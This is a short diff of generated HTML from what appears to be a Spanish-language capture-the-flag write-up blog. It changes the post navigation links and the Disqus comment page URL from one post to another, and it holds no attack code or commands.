             </div>
@@ -2083,22 +2073,18 @@ Nos encontramos con las siguientes características y dificultades , en el tendr
 
   
     <a
-      href="/posts/alzheimer/"
+      href="/posts/secretjenkins/"
       class="btn btn-outline-primary"
       aria-label="Older"
     >
-      <p>Alzheimer, HACKMYVM</p>
+      <p>SecretJenkins , DockerLabs</p>
     </a>
   
 
   
-    <a
-      href="/posts/domain/"
-      class="btn btn-outline-primary"
-      aria-label="Newer"
-    >
-      <p>Domain , DOCKERLABS</p>
-    </a>
+    <div class="btn btn-outline-primary disabled" aria-label="Newer">
+      <p>-</p>
+    </div>
   
 </nav>
 
@@ -2115,8 +2101,8 @@ Nos encontramos con las siguientes características y dificultades , en el tendr
 
 <script type="text/javascript">
   var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/posts/pyred/';
-    this.page.identifier = '/posts/pyred/';
+    this.page.url = 'http://localhost:4000/posts/breakssh/';
+    this.page.identifier = '/posts/breakssh/';
   };
 
   /* Lazy loading */
